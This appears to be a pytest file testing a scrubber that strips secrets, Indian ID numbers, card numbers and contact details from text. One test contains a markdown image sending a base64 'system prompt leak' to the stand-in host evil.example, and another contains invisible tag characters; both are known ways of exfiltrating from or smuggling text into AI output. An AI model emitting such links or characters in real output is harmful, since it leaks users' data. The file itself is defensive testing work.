from promptshield import scrub
from promptshield.checksums import verhoeff_valid


def _aadhaar():
    for n in range(234567890120, 234567890200):
        if verhoeff_valid(str(n)):
            return str(n)
    raise AssertionError


def test_clean_text_unchanged():
    result = scrub("The capital of Gujarat is Gandhinagar.")
    assert result.text == "The capital of Gujarat is Gandhinagar."
    assert not result.changed


def test_secrets_and_pii_removed():
    a = _aadhaar()
    text = f"Key sk-ant-api03-AbCdEfGhIjKlMnOpQrStUvWxYz012345, Aadhaar {a}, card 4111 1111 1111 1111, call 98765 43210, PAN ABCPK1234D, mail ravi@example.com"
    result = scrub(text)
    for value in ("sk-ant", a, "4111", "98765", "ABCPK1234D", "ravi@example.com"):
        assert value not in result.text
    assert result.removed["Anthropic API key"] == 1
    assert result.removed["Aadhaar number"] == 1
    assert result.removed["card number"] == 1


def test_invalid_checksums_are_kept():
    assert "1234 5678 9012" in scrub("order 1234 5678 9012").text


def test_canary_obfuscated_removed():
    result = scrub("leak: p s - 9 f 2 c 1 a 7 b e 0 4 d 3 3 6 1", canaries=["PS-9f2c1a7be04d3361"])
    assert "[canary removed]" in result.text


def test_tracking_image_removed_but_allowlisted_kept():
    text = (
        "![a](https://evil.example/p.png?d=c3lzdGVtIHByb21wdCBsZWFr) ![b](https://cdn.acme.com/p.png?d=c3lzdGVtIHByb21wdCBsZWFr)"
    )
    result = scrub(text, allowed_domains=["acme.com"])
    assert "evil.example" not in result.text
    assert "cdn.acme.com" in result.text


def test_invisible_characters_removed():
    result = scrub("hi​\U000e0041 there")
    assert result.text == "hi there"
    assert result.removed["invisible character"] == 2


def test_keep_emails_and_custom_placeholder():
    result = scrub("mail ravi@example.com", emails=False, placeholder="<{kind}>")
    assert result.text == "mail ravi@example.com"
    assert scrub("mail ravi@example.com", placeholder="<{kind}>").text == "mail <email>"
